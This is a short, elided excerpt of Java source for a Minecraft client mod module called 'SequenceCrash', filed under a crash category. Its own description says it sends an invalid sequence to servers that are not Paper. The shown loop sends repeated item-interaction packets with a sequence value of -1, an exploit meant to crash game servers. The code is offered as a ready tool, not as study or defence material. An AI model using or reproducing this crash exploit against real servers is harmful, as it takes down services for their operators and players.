...
public class SequenceCrash extends Module {
    ...
    public SequenceCrash() {
        super(Saturn.Crash, "sequence-crash", "Sends an invalid sequence, only works on non-paper");
    }
        ...
        switch (mode.get()) {
            case Item -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1, 0.0f, 0.0f));
                }
            }
            case Block -> {
